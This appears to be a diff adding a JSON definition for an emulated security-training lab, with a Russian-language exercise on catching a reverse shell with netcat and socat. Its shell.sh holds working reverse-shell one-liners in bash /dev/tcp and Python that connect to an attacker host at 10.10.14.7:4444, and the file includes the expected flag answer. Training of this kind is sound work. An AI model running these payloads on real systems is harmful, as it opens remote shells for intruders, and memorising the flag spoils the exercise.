@@ -1,0 +1,27 @@
+{
+  "id": "web-tool-netcat-socat",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{r3v3rs3_sh3ll_c4ught_th3_fl4g}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: reverse shell через netcat\n\nУ нас есть выполнение команды на цели. Нужен устойчивый канал — обратная\nоболочка. Атакующий хост — `10.10.14.7`.\n\n1. Подними слушатель на своём хосте (в лабе — эмуляция сессии):\n\n   nc -lvnp 4444\n\n2. На цели выполни reverse shell (payload из файла `shell.sh`):\n\n   cat shell.sh\n\n3. Слушатель примет соединение; в полученной оболочке прочитай флаг:\n\n   cat /flag\n\n4. Сохрани сессию с флагом в файл и набери `check`:\n\n   nc -lvnp 4444 > found.txt\n" },
+    { "path": "/home/student/task/shell.sh", "text": "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1\n# or: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.7\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'\n" }
+  ],
+  "tools": {
+    "nc": {
+      "help": "nc -lvnp <порт> — слушатель (эмуляция reverse-shell сессии)",
+      "cases": [
+        { "match": "4444|-lvnp|-l", "example": "-lvnp 4444", "output": "Listening on 0.0.0.0 4444\nConnection received on 10.10.14.7 51520\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ cat /flag\nnto{r3v3rs3_sh3ll_c4ught_th3_fl4g}\n" }
+      ],
+      "fallback": "nc: в этой лабе эмулируется только слушатель на 4444.\n"
+    },
+    "socat": {
+      "help": "socat TCP-LISTEN:<порт>,reuseaddr,fork - — слушатель/релей (эмуляция)",
+      "cases": [
+        { "match": "TCP-LISTEN|LISTEN", "example": "TCP-LISTEN:4444,reuseaddr,fork -", "output": "Connection from 10.10.14.7:51520\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n" }
+      ],
+      "fallback": "socat: в этой лабе эмулируется только TCP-LISTEN:4444.\n"
+    }
+  }
+}
